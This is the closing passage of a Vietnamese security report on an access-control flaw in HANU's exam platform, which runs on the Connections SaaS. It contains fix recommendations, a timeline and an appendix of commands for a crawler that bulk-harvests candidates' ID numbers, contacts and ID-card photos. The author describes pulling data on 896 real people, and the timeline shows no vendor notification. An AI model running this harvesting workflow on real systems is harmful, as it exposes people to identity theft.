\textbf{Giải pháp}: Sử dụng thuật toán chờ thông minh (smart wait - polling text trên DOM thay vì chờ timeout cố định), tự động thiết lập lại session khi thất bại, liên tục lưu CSV định kỳ sau mỗi 10 thí sinh, và tích hợp xử lý Ctrl+C để lưu toàn bộ dữ liệu đang thu thập trước khi ngắt ứng dụng.

% ===================================================================
\section{Khuyến nghị}
\label{sec:recommendations}

\subsection{Dành cho HANU (Khắc phục Ngay lập tức)}

\begin{enumerate}
    \item \textbf{Kiểm toán bảo mật phía Nhà cung cấp}: Yêu cầu I\&E Việt Nam tiến hành đánh giá bảo mật tổng thể nền tảng Connections.
    \item \textbf{Gỡ bỏ ảnh chụp thẻ CCCD}: Xóa toàn bộ hình ảnh thẻ CCCD đã lưu trữ khỏi nền tảng hoặc chuyển chúng sang hệ thống lưu trữ có kiểm soát truy cập nghiêm ngặt.
    \item \textbf{Bổ sung robots.txt / noindex}: Ngăn chặn các bộ máy tìm kiếm (search engine) lập chỉ mục các trang chi tiết của thí sinh; yêu cầu Google xóa bỏ (remove) các trang hiện đã bị lưu cache.
    \item \textbf{Hạn chế quyền truy cập file PDF}: Ẩn các danh sách thí sinh sau bước xác thực hoặc che mờ (redact) các cột chứa thông tin nhạy cảm.
    \item \textbf{Đánh giá các giải pháp nền tảng thay thế}: Cân nhắc chuyển đổi sang một nền tảng khác có đầy đủ các biện pháp kiểm soát truy cập (Access control).
\end{enumerate}

\subsection{Dành cho I\&E Việt Nam / Nền tảng Connections (Khắc phục Cấp thiết)}

\begin{enumerate}
    \item \textbf{Triển khai xác thực API}: Mọi điểm cuối XHR đều phải yêu cầu một token phiên (session token) hợp lệ kết hợp với phân quyền kiểm soát truy cập theo vai trò (Role-based access).
    \item \textbf{Thêm Kiểm soát Truy cập Cấp trường (Field-level access control)}: Các trường dữ liệu nhạy cảm (CCCD, Số điện thoại, tham chiếu File) phải bị giới hạn, chỉ các phiên đăng nhập quyền quản trị (admin) mới được truy cập.
    \item \textbf{Bảo mật Image CDN}: Các URL hình ảnh phải yêu cầu kèm theo token xác thực và phải được xác thực ở phía máy chủ (server-side), không thể chỉ dựa vào việc mã hóa đường dẫn.
    \item \textbf{Render Server-side cho dữ liệu nhạy cảm}: Dịch chuyển logic hiển thị PII lên xử lý phía server; tuyệt đối không gửi dữ liệu nhạy cảm thô ra ngoài ngữ cảnh các trang web công cộng.
    \item \textbf{Giới hạn tốc độ và Phát hiện Hành vi bất thường}: Triển khai giới hạn truy vấn (Rate Limit) dựa trên IP và hệ thống cảnh báo khi phát hiện các mẫu tải hàng loạt.
    \item \textbf{Kiểm toán Bảo mật toàn bộ khách hàng}: Những lỗ hổng tương tự khả năng rất cao đang ảnh hưởng tới toàn bộ các tổ chức sử dụng nền tảng Connections.
\end{enumerate}

\subsection{Kế hoạch Dài hạn}

\begin{enumerate}
    \item \textbf{Rà soát tính tuân thủ quy định (Compliance)}: Đánh giá khả năng tuân thủ của hệ thống theo Nghị định 13/2023/NĐ-CP về Bảo vệ dữ liệu cá nhân của Việt Nam.
    \item \textbf{Chương trình Kiểm thử Xâm nhập (Pentest)}: Thiết lập kế hoạch kiểm thử bảo mật định kỳ cho hệ thống.
    \item \textbf{Tối thiểu hóa Dữ liệu (Data Minimization)}: Xem xét lại việc có cần thiết phải lưu giữ ảnh thẻ CCCD của công dân sau khi quy trình đối chiếu danh tính ban đầu đã hoàn tất hay không.
    \item \textbf{Phản ứng Sự cố (Incident Response)}: Thông báo cho các thí sinh bị ảnh hưởng về vụ việc lộ lọt dữ liệu đúng theo các yêu cầu của pháp luật.
\end{enumerate}

% ===================================================================
\section{Kết luận}
\label{sec:conclusion}

Nghiên cứu này là bằng chứng rõ ràng về một lỗ hổng phơi bày dữ liệu đặc biệt nghiêm trọng trong ứng dụng web của Trung tâm Khảo thí HANU, hệ thống được chạy trên nền tảng Connections SaaS của công ty I\&E Việt Nam. Sự kết hợp giữa Google dorking, dịch ngược framework JavaScript, khai thác lỗi IDOR, duyệt khóa ngoại chéo bảng, và thu thập hình ảnh từ CDN đã cho phép tôi trích xuất có hệ thống toàn bộ dữ liệu cá nhân của 896 thí sinh - bao gồm số căn cước công dân, ảnh chụp thẻ (mặt trước và mặt sau), dân tộc, nơi sinh, số điện thoại và địa chỉ email.

Lỗ hổng này không xuất phát từ một bug code riêng lẻ mà là hệ quả từ một quyết định thiết kế kiến trúc cơ bản vô cùng sai lầm: nền tảng Connections không có bất kỳ ranh giới kiểm soát truy cập nào giữa khách viếng thăm trang web công khai và cơ sở dữ liệu cốt lõi bên dưới. Bất kỳ điểm cuối API nào, mọi bảng cơ sở dữ liệu, mọi trường dữ liệu, mọi file đã được upload - bao gồm cả hình ảnh các giấy tờ tùy thân do chính phủ cấp - đều có thể bị truy cập bởi bất kỳ ai tải trang và gọi đến các hàm JavaScript của framework. 

Sự rò rỉ hình ảnh CCCD là một mối nguy hại đặc biệt nghiêm trọng vì các dữ liệu này tạo điều kiện cực lớn cho việc mạo danh, qua mặt quy trình KYC, và tội phạm tài chính quy mô lớn. Không giống như việc thay đổi một mật khẩu bị lộ, dữ liệu thẻ CCCD khi đã bị đánh cắp thì không bao giờ có thể "đặt lại" hay thu hồi được.

Các phát hiện này mang đến 3 bài học mang tính sống còn:
\begin{enumerate}
    \item \textbf{Rủi ro từ các Nhà cung cấp bên thứ ba là hoàn toàn có thật}: Mọi tổ chức ủy thác dữ liệu nhạy cảm cho một nền tảng SaaS bắt buộc phải kiểm toán kiến trúc bảo mật của nền tảng đó, chứ không thể chỉ đánh giá dựa trên các tính năng phần mềm.
    \item \textbf{Bảo mật ở phía Client (Client-side) không phải là bảo mật}: Việc kiểm soát quyền truy cập bắt buộc phải thực thi tại máy chủ (Server-side). Chặn hoặc "bảo vệ" dữ liệu bằng JavaScript là sự bảo mật vô nghĩa trước một người dùng mở console của trình duyệt.
    \item \textbf{Bảo mật bằng sự che đậy luôn thất bại (Security through obscurity fails)}: Các URL được mã hóa, các dòng code bị làm rối (minified), và các chuỗi ID đã bị băm (hash-based) không bao giờ có thể thay thế được các biện pháp kiểm soát bảo mật xác thực.
\end{enumerate}

% ===================================================================
\appendix
\section{Các Công cụ Sử dụng}
\label{app:tools}

\begin{table}[H]
\centering
\caption{Các phần mềm/thư viện đã sử dụng (Dependencies)}
\begin{tabular}{@{}lll@{}}
\toprule
\textbf{Công cụ} & \textbf{Phiên bản} & \textbf{Mục đích sử dụng} \\
\midrule
Python & 3.12 & Môi trường chạy script chính \\
requests & Mới nhất & Giao thức HTTP để tải ảnh và PDF \\
pdfplumber & Mới nhất & Trích xuất các bảng dữ liệu từ PDF \\
Playwright & Mới nhất & Trình duyệt headless (Thực thi JS + Quét DOM) \\
Chromium & (Tích hợp) & Engine trình duyệt dùng để render các trang \\
\bottomrule
\end{tabular}
\end{table}

\section{Mốc thời gian Công bố}
\label{app:timeline}

\begin{table}[H]
\centering
\begin{tabular}{@{}p{3.5cm}p{10cm}@{}}
\toprule
\textbf{Ngày / Giờ} & \textbf{Sự kiện} \\
\midrule
25/02/2026 13:00 & Phát hiện lỗ hổng qua hệ thống lập chỉ mục tìm kiếm Google \\
25/02/2026 15:30 & Dịch ngược hoàn thành Framework; Lập bản đồ Schema CSDL \\
25/02/2026 17:00 & Xác nhận khai thác API thành công; Truy cập được dữ liệu CCCD \\
25/02/2026 19:30 & Phân tích thành công CDN hình ảnh; Tải xuống được các ảnh thẻ CCCD \\
25/02/2026 20:00 & Bắt đầu phát triển công cụ tự động hóa \\
25/02/2026 21:00 & Giai đoạn 1 hoàn tất: Trích xuất 896 SBD từ 32 tập PDF \\
26/02/2026 01:30 & Giai đoạn 2 bắt đầu: Chạy song song API crawl (3 workers) \\
26/02/2026 04:30 & Giai đoạn 2 hoàn tất: Xử lý thành công 896/896 hồ sơ \\
26/02/2026 09:00 & Hoàn tất gộp dữ liệu: 2.449 hình ảnh, tổng dung lượng 223 MB \\
26/02/2026 13:00 & Hoàn thiện báo cáo kỹ thuật \\
\bottomrule
\end{tabular}
\end{table}

\section{Thuật ngữ (Glossary)}
\label{app:glossary}

\begin{table}[H]
\centering
\begin{tabular}{@{}p{3.5cm}p{11cm}@{}}
\toprule
\textbf{Thuật ngữ} & \textbf{Định nghĩa} \\
\midrule
CCCD & Căn cước công dân - Thẻ Căn cước mới \\
CMND & Chứng minh nhân dân - Thẻ Chứng minh thư (mẫu cũ) \\
HANU & Hanoi University (\ Đại học Hà Nội) \\
SBD & Số báo danh - Số thứ tự làm bài thi \\
VSTEP & Vietnamese Standardized Test of English Proficiency \\
IDOR & Insecure Direct Object Reference - Tham chiếu đối tượng trực tiếp không an toàn \\
SaaS & Software as a Service - Phần mềm dạng dịch vụ \\
CDN & Content Delivery Network - Mạng phân phối nội dung (Tệp tin tĩnh, hình ảnh) \\
PII & Personally Identifiable Information - Thông tin định danh cá nhân \\
KYC & Know Your Customer - Quy trình xác minh khách hàng (Của các ngân hàng/Ví) \\
I\&E Việt Nam & Công ty cung cấp và vận hành nền tảng Connections \\
\bottomrule
\end{tabular}
\end{table}

\section{Mẫu Bản ghi Dữ liệu (Sample Data Records)}
\label{app:samples}

Dưới đây là hai bản ghi tiêu biểu được trích xuất từ tập dữ liệu, trong đó các thông tin nhận dạng cá nhân thực tế đã được che mờ (redacted):

\begin{lstlisting}[language={},title={Bản ghi Mẫu 1 (Đã che mờ)}]
{
  "sbd": "AN1***",
  "ho_ten": "[REDACTED]",
  "ngay_sinh": "28/09/2000",
  "gioi_tinh": "Nu",
  "cccd": "022XXXXXXXXX",         // CCCD 12-so dinh dang moi
  "sdt": "037XXXXXXX",
  "email": "[redacted]@gmail.com",
  "don_vi": "",
  "dan_toc": "Kinh",
  "noi_sinh": "Tinh Bac Ninh",
  "img_front": "output/images/AN1***_front.jpg",
  "img_back": "output/images/AN1***_back.jpg"
}
\end{lstlisting}

\begin{lstlisting}[language={},title={Bản ghi Mẫu 2 (Đã che mờ)}]
{
  "sbd": "TQ1***",
  "ho_ten": "[REDACTED]",
  "ngay_sinh": "03/07/2000",
  "gioi_tinh": "Nu",
  "cccd": "180XXXXXXXXX",         // Mot so SV su dung MSSV thay cho CCCD
  "sdt": "036XXXXXXX",
  "email": "180XXXXXXXX@s.hanu.edu.vn",  // Ma so sinh vien
  "don_vi": "",
  "dan_toc": "Kinh",
  "noi_sinh": "",
  "img_front": "output/images/TQ1***_front.jpg",
  "img_back": "output/images/TQ1***_back.jpg"
}
\end{lstlisting}

\noindent \textbf{Các điểm đáng chú ý:}
\begin{itemize}[noitemsep]
    \item Số CCCD được lưu trữ dưới dạng văn bản thuần túy (có dấu nháy đơn phía trước chỉ để định dạng cho tệp CSV).
    \item Các tệp hình ảnh là những bức ảnh chụp thẻ căn cước vật lý ở định dạng JPEG tiêu chuẩn.
    \item Trường \texttt{don\_vi} (nơi công tác) có tỷ lệ điền rất thấp (15.1\%), cho thấy phần lớn thí sinh là sinh viên chưa đi làm.
\end{itemize}

\section{Các bước Tái tạo (Reproduction Steps)}
\label{app:reproduction}

\textbf{Yêu cầu hệ thống (Prerequisites):}
\begin{lstlisting}[language=bash,title={Thiết lập Môi trường}]
# Yeu cau cai dat Python 3.12+
pip install requests pdfplumber playwright
playwright install chromium
\end{lstlisting}

\noindent \textbf{Giai đoạn 1: Trích xuất Danh sách Thí sinh từ PDF}
\begin{lstlisting}[language=bash]
python3 crawl_hanu.py --phase 1
# Tai xuong 32 tap PDF tu CDN file tinh
# Phan tich cac bang thi sinh su dung thu vien pdfplumber
# Dau ra: output/candidates_phase1.csv (896 SBD duy nhat)
# Dau ra: output/file_index.json (Metadata cua file PDF)
# Thoi gian chay: ~2 phut
\end{lstlisting}

\noindent \textbf{Giai đoạn 2: Tìm kiếm Toàn diện dựa trên API}
\begin{lstlisting}[language=bash]
python3 crawl_hanu.py --phase 2              # Mac dinh: chay 3 workers
python3 crawl_hanu.py --phase 2 --limit 10   # Chay thu nghiem voi 10 thi sinh
python3 crawl_hanu.py --phase 2 --workers 1  # Chay 1 worker (an toan hon)
# Voi moi SBD: truy van JS API -> giai ma CCCD -> render trang -> tai anh xuong
# Dau ra: output/candidates_phase2.csv
# Dau ra: output/images/{sbd}_front.jpg, {sbd}_back.jpg, {sbd}_extra.jpg
# Thoi gian chay: ~3 tieng voi toc do 5 thi sinh/phut (bao gom viec render trang)
# Ho tro Resume: Chay lai lenh de tiep tuc tu diem check-point gan nhat
\end{lstlisting}

\noindent \textbf{Gộp dữ liệu Giai đoạn 1 + Giai đoạn 2}
\begin{lstlisting}[language=bash]
python3 crawl_hanu.py --merge
# Ghep/Join du lieu tu PDF va du lieu tu API thong qua SBD lam khoa chinh
# Dau ra: output/candidates_full.csv (chua tat ca cac truong thong tin)
\end{lstlisting}

\noindent \textbf{Chạy toàn bộ luồng (Tất cả các giai đoạn):}
\begin{lstlisting}[language=bash]
python3 crawl_hanu.py --all
\end{lstlisting}

\end{document}